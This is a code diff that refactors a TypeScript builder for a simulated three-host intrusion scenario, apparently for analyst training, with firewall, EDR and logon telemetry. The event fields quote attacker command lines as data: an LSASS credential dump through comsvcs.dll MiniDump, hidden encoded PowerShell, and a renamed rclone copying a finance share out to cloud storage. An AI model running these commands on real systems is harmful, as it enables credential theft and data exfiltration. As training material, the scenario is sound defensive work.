@@ -27,6 +27,9 @@
 
 import type { ScenarioBundle, TelemetryEvent, IOC, ScenarioQuestion } from "@/lib/sim/types";
 import { makeSha256 } from "@/lib/sim/iocs";
+import { panWeb, panConnection } from "@/lib/sim/emitters/paloalto";
+import { csProcess, csProcessAccess, csNetwork, csAlert } from "@/lib/sim/emitters/crowdstrike";
+import { winLogon } from "@/lib/sim/emitters/windowsSecurity";
 
 export function buildMultiHostIntrusionScenario(
   scenarioId = "multi-host-intrusion-2026",
@@ -58,316 +61,126 @@ export function buildMultiHostIntrusionScenario(
   const psexecHash   = makeSha256("multihost_psexesvc_service_2026");
   const rcloneHash   = makeSha256("multihost_renamed_rclone_svchost_update_2026");
 
+  const cxN = "nexacorp" as const;
+
   const events: TelemetryEvent[] = [
     // ═══════════ INCIDENT 1 — FIN-WS-08 (initial access) ═══════════
-    {
-      id: "evt_mhi_ws1_download",
-      ts: T(0),
-      source: "firewall",
-      vendor: "Palo Alto Networks PAN-OS",
-      event_type: "http_request",
-      hostname: ws.hostname,
-      user_email: victim.email,
-      user_title: "Accounts Payable Clerk",
-      src_ip: ws.ip,
-      severity: "low",
-      incident_id: INC_WS,
-      description:
-        "FIN-WS-08 downloaded Invoice_Q3_4471.docm from a lookalike supplier portal at 18:40, allowed under the category business-and-economy.",
-      file: { name: "Invoice_Q3_4471.docm", path: "/inv/Invoice_Q3_4471.docm", extension: "docm", sha256: macroDocHash },
-      network: { url: "https://supplier-invoices-nexa.com/inv/Invoice_Q3_4471.docm", domain: "supplier-invoices-nexa.com", method: "GET", status: 200, bytes_in: 88_320 },
-      raw: {
-        "pan.type": "THREAT", "pan.subtype": "file", "pan.action": "alert",
-        "pan.src": ws.ip, "pan.srcuser": `nexacorp\\${victim.sam}`, "pan.dst": "104.21.9.11", "pan.dport": "443",
-        "pan.app": "web-browsing", "pan.category": "business-and-economy",
-        "pan.url": "supplier-invoices-nexa.com/inv/Invoice_Q3_4471.docm",
-        "pan.filename": "Invoice_Q3_4471.docm", "pan.filetype": "ms-office", "pan.file_hash": macroDocHash,
-        "source.ip": ws.ip, "url.domain": "supplier-invoices-nexa.com", "action_result": "alert",
-      },
-    },
-    {
-      id: "evt_mhi_ws2_macro_spawn",
-      ts: T(3 * MIN),
-      source: "edr",
-      vendor: "CrowdStrike Falcon",
-      event_type: "process_create",
-      hostname: ws.hostname,
-      user_email: victim.email,
-      src_ip: ws.ip,
-      severity: "high",
-      mitre_technique: "T1059.003",
-      mitre_tactic: "Execution",
-      incident_id: INC_WS,
+    // 1. The macro invoice is downloaded from a lookalike supplier portal.
+    panWeb({
+      companyId: cxN, id: "evt_mhi_ws1_download", ts: T(0), host: ws.hostname, srcIp: ws.ip, user: victim.email,
+      userTitle: "Accounts Payable Clerk", incidentId: INC_WS, severity: "low",
+      url: "https://supplier-invoices-nexa.com/inv/Invoice_Q3_4471.docm", domain: "supplier-invoices-nexa.com",
+      category: "business-and-economy", action: "alert", dstIp: "104.21.9.11", bytesIn: 88_320,
+      file: { name: "Invoice_Q3_4471.docm", path: "/inv/Invoice_Q3_4471.docm", sha256: macroDocHash }, fileType: "ms-office",
+      description: "FIN-WS-08 downloaded Invoice_Q3_4471.docm from a lookalike supplier portal at 18:40, allowed under the category business-and-economy.",
+    }),
+    // 2. The enabled macro spawns cmd.exe under WINWORD.EXE.
+    csProcess({
+      companyId: cxN, id: "evt_mhi_ws2_macro_spawn", ts: T(3 * MIN), host: ws.hostname, srcIp: ws.ip, user: victim.email,
+      processName: "cmd.exe", processPath: "C:\\Windows\\System32\\cmd.exe",
+      cmdline: "cmd.exe /c powershell -nop -w hidden -enc SQBFAF...", parentName: "WINWORD.EXE", parentPid: 5044, pid: 6112,
+      mitre: "T1059.003", tactic: "Execution", severity: "high", incidentId: INC_WS,
       description: "WINWORD.EXE spawned cmd.exe at 18:43 after the invoice macro was enabled.",
-      process: { name: "cmd.exe", pid: 6112, path: "C:\\Windows\\System32\\cmd.exe", parent_name: "WINWORD.EXE", parent_pid: 5044, cmdline: "cmd.exe /c powershell -nop -w hidden -enc SQBFAF...", user: `NEXACORP\\${victim.sam}` },
-      raw: {
-        "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.sensor.id": sensorId,
-        "process.name": "cmd.exe", "process.pid": "6112",
-        "process.parent.name": "WINWORD.EXE", "process.parent.pid": "5044",
-        "process.command_line": "cmd.exe /c powershell -nop -w hidden -enc SQBFAF...",
-        "user.name": `NEXACORP\\${victim.sam}`, "host.name": ws.hostname, "host.ip": ws.ip,
-      },
-    },
-    {
-      id: "evt_mhi_ws3_beacon",
-      ts: T(3 * MIN + 8 * SEC),
-      source: "edr",
-      vendor: "CrowdStrike Falcon",
-      event_type: "process_create",
-      hostname: ws.hostname,
-      user_email: victim.email,
-      src_ip: ws.ip,
-      severity: "critical",
-      mitre_technique: "T1059.001",
-      mitre_tactic: "Execution",
-      incident_id: INC_WS,
-      is_detection: true, // alert-grade: encoded PowerShell loading the Cobalt Strike beacon (the foothold crux)
+    }),
+    // 3. THE FOOTHOLD CRUX — encoded PowerShell injects a Cobalt Strike beacon.
+    csProcess({
+      companyId: cxN, id: "evt_mhi_ws3_beacon", ts: T(3 * MIN + 8 * SEC), host: ws.hostname, srcIp: ws.ip, user: victim.email,
+      processName: "powershell.exe", processPath: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      cmdline: "powershell -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AC4A", parentName: "cmd.exe", parentPid: 6112, pid: 6180,
+      sha256: beaconHash, signed: true, isDetection: true, mitre: "T1059.001", tactic: "Execution", severity: "critical", incidentId: INC_WS,
       description: "cmd.exe launched an encoded PowerShell that decoded and injected a Cobalt Strike beacon into memory.",
-      process: { name: "powershell.exe", pid: 6180, path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", parent_name: "cmd.exe", parent_pid: 6112, cmdline: "powershell -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AC4A", user: `NEXACORP\\${victim.sam}`, hash: { sha256: beaconHash } },
-      raw: {
-        "crowdstrike.event_simpleName": "SuspiciousDllLoad",
-        "crowdstrike.detection.tactic": "Execution", "crowdstrike.detection.technique": "Command and Scripting Interpreter: PowerShell",
-        "crowdstrike.detection.technique_id": "T1059.001", "crowdstrike.detection.severity": "Critical",
-        "crowdstrike.detection.pattern_disposition_description": "Detection, No Action",
-        "crowdstrike.sensor.id": sensorId,
-        "process.name": "powershell.exe", "process.pid": "6180", "process.parent.name": "cmd.exe", "process.parent.pid": "6112",
-        "process.hash.sha256": beaconHash, "process.code_signature.status": "signed",
-        "user.name": `NEXACORP\\${victim.sam}`, "host.name": ws.hostname, "host.ip": ws.ip,
-      },
-    },
-    {
-      id: "evt_mhi_ws4_c2",
-      ts: T(4 * MIN),
-      source: "firewall",
-      vendor: "Palo Alto Networks PAN-OS",
-      event_type: "http_request",
-      hostname: ws.hostname,
-      user_email: victim.email,
-      src_ip: ws.ip,
-      severity: "high",
-      mitre_technique: "T1071.001",
-      mitre_tactic: "Command and Control",
-      incident_id: INC_WS,
+    }),
+    // 4. The beacon heartbeat — a repeating TLS session to the C2 (SSL, not decrypted).
+    panConnection({
+      companyId: cxN, id: "evt_mhi_ws4_c2", ts: T(4 * MIN), host: ws.hostname, srcIp: ws.ip, user: victim.email,
+      app: "ssl", domain: c2, dstIp: c2ip, url: `${c2}/api/v2/heartbeat`, category: "unknown", action: "allow",
+      bytesOut: 512, bytesIn: 128, repeatCount: 14, mitre: "T1071.001", tactic: "Command and Control", severity: "high", incidentId: INC_WS,
       description: "FIN-WS-08 began beaconing to cdn-sync-eu.net every 60s with a fixed jitter — a Cobalt Strike malleable C2 profile.",
-      network: { url: `https://${c2}/api/v2/heartbeat`, domain: c2, method: "GET", status: 200, bytes_out: 512, bytes_in: 128 },
-      raw: {
-        "pan.type": "TRAFFIC", "pan.action": "allow", "pan.src": ws.ip, "pan.dst": c2ip, "pan.dport": "443",
-        "pan.app": "ssl", "pan.category": "unknown", "pan.url": `${c2}/api/v2/heartbeat`, "pan.repeat_count": "14",
-        "source.ip": ws.ip, "url.domain": c2, "action_result": "allow",
-      },
-    },
+    }),
+    // 5. The Falcon detection that opened incident 1.
     {
-      id: "evt_mhi_ws5_alert",
-      ts: T(5 * MIN),
-      source: "edr",
-      vendor: "CrowdStrike Falcon",
-      event_type: "edr_alert",
-      hostname: ws.hostname,
-      user_email: victim.email,
-      src_ip: ws.ip,
-      severity: "critical",
-      mitre_technique: "T1059.001",
-      mitre_tactic: "Execution",
-      incident_id: INC_WS,
-      is_detection: true,  // the Falcon detection that opened incident 1
-      edr_scope: "edr",    // endpoint-primary foothold → investigate FIN-WS-08 in the EDR console
-      description: "Falcon raised a Critical detection on FIN-WS-08: encoded PowerShell decoded an in-memory beacon under WINWORD.EXE, with a repeating TLS heartbeat to external infrastructure.",
-      raw: {
-        "crowdstrike.event_simpleName": "DetectionSummaryEvent",
-        "crowdstrike.detection.name": "EncodedPowerShellBeaconUnderOffice",
-        "crowdstrike.detection.severity": "Critical", "crowdstrike.detection.technique_id": "T1059.001",
-        "crowdstrike.detection.process_tree": "WINWORD.EXE > cmd.exe > powershell.exe",
-        "crowdstrike.network_containment_state": "Not Contained", "crowdstrike.sensor.id": sensorId,
-        "host.name": ws.hostname, "host.ip": ws.ip, "user.name": `NEXACORP\\${victim.sam}`,
-      },
+      ...csAlert({
+        companyId: cxN, id: "evt_mhi_ws5_alert", ts: T(5 * MIN), host: ws.hostname, srcIp: ws.ip, user: victim.email,
+        threatName: "EncodedPowerShellBeaconUnderOffice", severity: "critical", mitre: "T1059.001", tactic: "Execution",
+        technique: "Command and Scripting Interpreter: PowerShell", processTree: "WINWORD.EXE > cmd.exe > powershell.exe",
+        action: "detected", incidentId: INC_WS,
+        description: "Falcon raised a Critical detection on FIN-WS-08: encoded PowerShell decoded an in-memory beacon under WINWORD.EXE, with a repeating TLS heartbeat to external infrastructure.",
+      }),
+      edr_scope: "edr",
     },
 
     // ═══════════ INCIDENT 2 — FS-SRV-03 (lateral + credential access) ═══════════
-    {
-      id: "evt_mhi_fs1_logon",
-      ts: T(19 * MIN),
-      source: "ad",
-      vendor: "Windows Security",
-      event_type: "auth_success",
-      hostname: fs.hostname,
-      user_email: victim.email,
-      src_ip: fs.ip,
-      severity: "medium",
-      mitre_technique: "T1021.002",
-      mitre_tactic: "Lateral Movement",
-      incident_id: INC_FS,
+    // 6. The foothold reaches the file server — a Type-3 NTLM logon from FIN-WS-08.
+    winLogon({
+      companyId: cxN, id: "evt_mhi_fs1_logon", ts: T(19 * MIN), host: fs.hostname, fqdn: fs.hostname, srcIp: ws.ip,
+      targetUser: victim.sam, userEmail: victim.email, logonType: 3, authPackage: "NTLM", workstation: ws.hostname,
+      severity: "medium", mitre: "T1021.002", tactic: "Lateral Movement", incidentId: INC_FS,
       description: "A Type 3 network logon for n.harel arrived on FS-SRV-03 from FIN-WS-08 at 18:59 — the foothold host reaching the file server over SMB.",
-      raw: {
-        "winlog.event_id": "4624", "winlog.channel": "Security",
-        "winlog.event_data.LogonType": "3", "winlog.event_data.TargetUserName": victim.sam,
-        "winlog.event_data.IpAddress": ws.ip, "winlog.event_data.WorkstationName": ws.hostname,
-        "winlog.computer_name": fs.hostname, "winlog.event_data.AuthenticationPackageName": "NTLM",
-      },
-    },
-    {
-      id: "evt_mhi_fs2_psexec",
-      ts: T(19 * MIN + 40 * SEC),
-      source: "edr",
-      vendor: "CrowdStrike Falcon",
-      event_type: "process_create",
-      hostname: fs.hostname,
-      user_email: victim.email,
-      src_ip: fs.ip,
-      severity: "high",
-      mitre_technique: "T1021.002",
-      mitre_tactic: "Lateral Movement",
-      incident_id: INC_FS,
+    }),
+    // 7. A PsExec landing — services.exe → PSEXESVC.exe → cmd.exe.
+    csProcess({
+      companyId: cxN, id: "evt_mhi_fs2_psexec", ts: T(19 * MIN + 40 * SEC), host: fs.hostname, srcIp: fs.ip, user: victim.email,
+      processName: "cmd.exe", processPath: "C:\\Windows\\System32\\cmd.exe", cmdline: "cmd.exe /c C:\\Windows\\Temp\\d.bat",
+      parentName: "PSEXESVC.exe", parentPid: 4188, pid: 4210, sha256: psexecHash, mitre: "T1021.002", tactic: "Lateral Movement",
+      severity: "high", incidentId: INC_FS,
       description: "services.exe started PSEXESVC.exe on FS-SRV-03, which spawned cmd.exe — a PsExec remote-execution landing.",
-      process: { name: "cmd.exe", pid: 4210, path: "C:\\Windows\\System32\\cmd.exe", parent_name: "PSEXESVC.exe", parent_pid: 4188, cmdline: "cmd.exe /c C:\\Windows\\Temp\\d.bat", user: `NEXACORP\\${victim.sam}`, hash: { sha256: psexecHash } },
-      raw: {
-        "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.sensor.id": sensorId,
-        "process.name": "cmd.exe", "process.pid": "4210", "process.parent.name": "PSEXESVC.exe", "process.parent.pid": "4188",
-        "process.command_line": "cmd.exe /c C:\\Windows\\Temp\\d.bat",
-        "user.name": `NEXACORP\\${victim.sam}`, "host.name": fs.hostname, "host.ip": fs.ip,
-      },
-    },
-    {
-      id: "evt_mhi_fs3_lsass",
-      ts: T(20 * MIN + 30 * SEC),
-      source: "edr",
-      vendor: "CrowdStrike Falcon",
-      event_type: "process_access",
-      hostname: fs.hostname,
-      user_email: victim.email,
-      src_ip: fs.ip,
-      severity: "critical",
-      mitre_technique: "T1003.001",
-      mitre_tactic: "Credential Access",
-      incident_id: INC_FS,
-      is_detection: true, // alert-grade: the LSASS MiniDump (the credential-theft crux)
+    }),
+    // 8. THE CREDENTIAL-THEFT CRUX — rundll32 comsvcs MiniDump against lsass with full access.
+    csProcessAccess({
+      companyId: cxN, id: "evt_mhi_fs3_lsass", ts: T(20 * MIN + 30 * SEC), host: fs.hostname, srcIp: fs.ip, user: victim.email,
+      processName: "rundll32.exe", processPath: "C:\\Windows\\System32\\rundll32.exe",
+      cmdline: "rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 712 C:\\Windows\\Temp\\lsass.dmp full",
+      parentName: "cmd.exe", parentPid: 4210, pid: 4360, targetProcess: "lsass.exe", targetPid: 712, grantedAccess: "0x1FFFFF",
+      simpleName: "ProcessAccessIOC", threatName: "LsassMiniDumpViaComsvcs", mitre: "T1003.001", tactic: "Credential Access",
+      technique: "OS Credential Dumping: LSASS Memory", severity: "critical", isDetection: true, incidentId: INC_FS,
       description: "rundll32.exe called comsvcs.dll MiniDump against lsass.exe with full access, writing C:\\Windows\\Temp\\lsass.dmp.",
-      process: { name: "rundll32.exe", pid: 4360, path: "C:\\Windows\\System32\\rundll32.exe", parent_name: "cmd.exe", parent_pid: 4210, cmdline: "rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 712 C:\\Windows\\Temp\\lsass.dmp full", user: `NEXACORP\\${victim.sam}` },
-      raw: {
-        "crowdstrike.event_simpleName": "ProcessAccessIOC",
-        "crowdstrike.detection.tactic": "Credential Access", "crowdstrike.detection.technique": "OS Credential Dumping: LSASS Memory",
-        "crowdstrike.detection.technique_id": "T1003.001", "crowdstrike.detection.severity": "Critical",
-        "crowdstrike.detection.pattern_disposition_description": "Detection, No Action",
-        "crowdstrike.GrantedAccess": "0x1FFFFF", "crowdstrike.TargetProcessName": "lsass.exe", "crowdstrike.sensor.id": sensorId,
-        "process.name": "rundll32.exe", "process.pid": "4360", "process.parent.name": "cmd.exe", "process.parent.pid": "4210",
-        "user.name": `NEXACORP\\${victim.sam}`, "host.name": fs.hostname, "host.ip": fs.ip,
-      },
-    },
+    }),
+    // 9. The Falcon detection that opened incident 2.
     {
-      id: "evt_mhi_fs4_alert",
-      ts: T(21 * MIN),
-      source: "edr",
-      vendor: "CrowdStrike Falcon",
-      event_type: "edr_alert",
-      hostname: fs.hostname,
-      user_email: victim.email,
-      src_ip: fs.ip,
-      severity: "critical",
-      mitre_technique: "T1003.001",
-      mitre_tactic: "Credential Access",
-      incident_id: INC_FS,
-      is_detection: true,   // the Falcon detection that opened incident 2
-      edr_scope: "hybrid",  // spans the host (LSASS dump) + the AD network logon that delivered the operator — pivot to EDR for FS-SRV-03
-      description: "Falcon raised a Critical detection on FS-SRV-03: LSASS memory was dumped via comsvcs.dll MiniDump by a PsExec-launched shell, moments after a network logon from FIN-WS-08.",
-      raw: {
-        "crowdstrike.event_simpleName": "DetectionSummaryEvent",
-        "crowdstrike.detection.name": "LsassMiniDumpViaComsvcs",
-        "crowdstrike.detection.severity": "Critical", "crowdstrike.detection.technique_id": "T1003.001",
-        "crowdstrike.detection.process_tree": "services.exe > PSEXESVC.exe > cmd.exe > rundll32.exe",
-        "crowdstrike.network_containment_state": "Not Contained", "crowdstrike.sensor.id": sensorId,
-        "host.name": fs.hostname, "host.ip": fs.ip, "user.name": `NEXACORP\\${victim.sam}`,
-      },
+      ...csAlert({
+        companyId: cxN, id: "evt_mhi_fs4_alert", ts: T(21 * MIN), host: fs.hostname, srcIp: fs.ip, user: victim.email,
+        threatName: "LsassMiniDumpViaComsvcs", severity: "critical", mitre: "T1003.001", tactic: "Credential Access",
+        technique: "OS Credential Dumping: LSASS Memory", processTree: "services.exe > PSEXESVC.exe > cmd.exe > rundll32.exe",
+        action: "detected", incidentId: INC_FS,
+        description: "Falcon raised a Critical detection on FS-SRV-03: LSASS memory was dumped via comsvcs.dll MiniDump by a PsExec-launched shell, moments after a network logon from FIN-WS-08.",
+      }),
+      edr_scope: "hybrid",
     },
 
     // ═══════════ INCIDENT 3 — BKP-SRV-02 (collection + exfil) ═══════════
-    {
-      id: "evt_mhi_bk1_stage",
-      ts: T(34 * MIN),
-      source: "edr",
-      vendor: "CrowdStrike Falcon",
-      event_type: "process_create",
-      hostname: bkp.hostname,
-      src_ip: bkp.ip,
-      severity: "high",
-      mitre_technique: "T1560.001",
-      mitre_tactic: "Collection",
-      incident_id: INC_BK,
+    // 10. THE COLLECTION CRUX — a renamed rclone stages the finance share.
+    csProcess({
+      companyId: cxN, id: "evt_mhi_bk1_stage", ts: T(34 * MIN), host: bkp.hostname, srcIp: bkp.ip, user: svc.sam,
+      processName: "svchost-update.exe", processPath: "C:\\ProgramData\\Adobe\\svchost-update.exe",
+      cmdline: "svchost-update.exe copy \\\\FS-SRV-03\\Finance R:\\stage --transfers 16", parentName: "cmd.exe", parentPid: 7602, pid: 7720,
+      sha256: rcloneHash, signed: false, originalFileName: "rclone.exe", mitre: "T1560.001", tactic: "Collection", severity: "high", incidentId: INC_BK,
       description: "svchost-update.exe — an unsigned binary in ProgramData — began recursively archiving \\\\FS-SRV-03\\Finance into 200 MB .r00 volumes on BKP-SRV-02.",
-      process: { name: "svchost-update.exe", pid: 7720, path: "C:\\ProgramData\\Adobe\\svchost-update.exe", parent_name: "cmd.exe", parent_pid: 7602, cmdline: "svchost-update.exe copy \\\\FS-SRV-03\\Finance R:\\stage --transfers 16", user: `NEXACORP\\${svc.sam}`, hash: { sha256: rcloneHash } },
-      raw: {
-        "crowdstrike.event_simpleName": "ProcessRollup2", "crowdstrike.sensor.id": sensorId,
-        "process.name": "svchost-update.exe", "process.pid": "7720", "process.parent.name": "cmd.exe", "process.parent.pid": "7602",
-        "process.hash.sha256": rcloneHash, "process.code_signature.status": "unsigned",
-        "process.original_file_name": "rclone.exe",
-        "user.name": `NEXACORP\\${svc.sam}`, "host.name": bkp.hostname, "host.ip": bkp.ip,
-      },
-    },
-    {
-      id: "evt_mhi_bk2_exfil_proc",
-      ts: T(41 * MIN),
-      source: "edr",
-      vendor: "CrowdStrike Falcon",
-      event_type: "net_connection",
-      hostname: bkp.hostname,
-      src_ip: bkp.ip,
-      severity: "critical",
-      mitre_technique: "T1567.002",
-      mitre_tactic: "Exfiltration",
-      incident_id: INC_BK,
-      is_detection: true, // alert-grade: the renamed rclone pushing the staged archive to cloud storage (the exfil crux)
+    }),
+    // 11. THE EXFIL CRUX — the renamed rclone pushes the staged archive to cloud storage.
+    csNetwork({
+      companyId: cxN, id: "evt_mhi_bk2_exfil_proc", ts: T(41 * MIN), host: bkp.hostname, srcIp: bkp.ip, user: svc.sam,
+      remoteIp: exfilIp, remotePort: 443, application: "tls", domain: exfilHost,
+      processName: "svchost-update.exe", processPath: "C:\\ProgramData\\Adobe\\svchost-update.exe",
+      cmdline: "svchost-update.exe copy R:\\stage remote:backup --transfers 16", pid: 7720, parentName: "cmd.exe", parentPid: 7602,
+      sha256: rcloneHash, bytesOut: 3_650_722_000, isDetection: true, mitre: "T1567.002", tactic: "Exfiltration", severity: "critical", incidentId: INC_BK,
       description: "svchost-update.exe opened a sustained TLS session to store.filedrop-transfer.net and transferred the staged R:\\stage volumes — 3.4 GB outbound over 9 minutes.",
-      process: { name: "svchost-update.exe", pid: 7720, path: "C:\\ProgramData\\Adobe\\svchost-update.exe", parent_name: "cmd.exe", parent_pid: 7602, cmdline: "svchost-update.exe copy R:\\stage remote:backup --transfers 16", user: `NEXACORP\\${svc.sam}`, hash: { sha256: rcloneHash } },
-      network: { domain: exfilHost, method: "PUT", status: 200, bytes_out: 3_650_722_000 },
-      dst_ip: exfilIp, dst_port: 443, protocol: "TLS",
-      raw: {
-        "crowdstrike.event_simpleName": "NetworkConnectIP4", "crowdstrike.sensor.id": sensorId,
-        "process.name": "svchost-update.exe", "process.pid": "7720",
-        "destination.ip": exfilIp, "destination.port": "443", "destination.domain": exfilHost,
-        "host.name": bkp.hostname, "host.ip": bkp.ip, "user.name": `NEXACORP\\${svc.sam}`,
-      },
-    },
-    {
-      id: "evt_mhi_bk3_fw",
-      ts: T(41 * MIN + 30 * SEC),
-      source: "firewall",
-      vendor: "Palo Alto Networks PAN-OS",
-      event_type: "http_request",
-      hostname: bkp.hostname,
-      src_ip: bkp.ip,
-      severity: "high",
-      mitre_technique: "T1567.002",
-      mitre_tactic: "Exfiltration",
-      incident_id: INC_BK,
+    }),
+    // 12. The firewall's view of the same upload — a large TLS session to an online-storage host.
+    panConnection({
+      companyId: cxN, id: "evt_mhi_bk3_fw", ts: T(41 * MIN + 30 * SEC), host: bkp.hostname, srcIp: bkp.ip, user: null,
+      app: "ssl", domain: exfilHost, dstIp: exfilIp, url: `${exfilHost}/upload`, category: "online-storage-and-backup",
+      action: "allow", bytesOut: 3_650_722_000, mitre: "T1567.002", tactic: "Exfiltration", severity: "high", incidentId: INC_BK,
       description: "The firewall recorded 3.4 GB of TLS upload from BKP-SRV-02 to store.filedrop-transfer.net, category online-storage-and-backup, allowed.",
-      network: { url: `https://${exfilHost}/upload`, domain: exfilHost, method: "PUT", status: 200, bytes_out: 3_650_722_000 },
-      raw: {
-        "pan.type": "TRAFFIC", "pan.action": "allow", "pan.src": bkp.ip, "pan.dst": exfilIp, "pan.dport": "443",
-        "pan.app": "ssl", "pan.category": "online-storage-and-backup", "pan.url": `${exfilHost}/upload`,
-        "pan.bytes_sent": "3650722000", "source.ip": bkp.ip, "url.domain": exfilHost, "action_result": "allow",
-      },
-    },
+    }),
+    // 13. The Falcon detection that opened incident 3.
     {
-      id: "evt_mhi_bk4_alert",
-      ts: T(43 * MIN),
-      source: "edr",
-      vendor: "CrowdStrike Falcon",
-      event_type: "edr_alert",
-      hostname: bkp.hostname,
-      src_ip: bkp.ip,
-      severity: "critical",
-      mitre_technique: "T1567.002",
-      mitre_tactic: "Exfiltration",
-      incident_id: INC_BK,
-      is_detection: true,  // the Falcon detection that opened incident 3
-      edr_scope: "edr",    // endpoint-primary staging + exfil on BKP-SRV-02 → investigate the host in the EDR console
-      description: "Falcon raised a Critical detection on BKP-SRV-02: an unsigned rclone-derived binary archived a file share and transferred multiple gigabytes to an online-storage host.",
-      raw: {
-        "crowdstrike.event_simpleName": "DetectionSummaryEvent",
-        "crowdstrike.detection.name": "MassStagingAndCloudExfil",
-        "crowdstrike.detection.severity": "Critical", "crowdstrike.detection.technique_id": "T1567.002",
-        "crowdstrike.detection.process_tree": "cmd.exe > svchost-update.exe",
-        "crowdstrike.network_containment_state": "Not Contained", "crowdstrike.sensor.id": sensorId,
-        "host.name": bkp.hostname, "host.ip": bkp.ip, "user.name": `NEXACORP\\${svc.sam}`,
-      },
+      ...csAlert({
+        companyId: cxN, id: "evt_mhi_bk4_alert", ts: T(43 * MIN), host: bkp.hostname, srcIp: bkp.ip, user: svc.sam,
+        threatName: "MassStagingAndCloudExfil", severity: "critical", mitre: "T1567.002", tactic: "Exfiltration",
+        technique: "Exfiltration to Cloud Storage", processTree: "cmd.exe > svchost-update.exe", action: "detected", incidentId: INC_BK,
+        description: "Falcon raised a Critical detection on BKP-SRV-02: an unsigned rclone-derived binary archived a file share and transferred multiple gigabytes to an online-storage host.",
+      }),
+      edr_scope: "edr",
     },
   ];
 
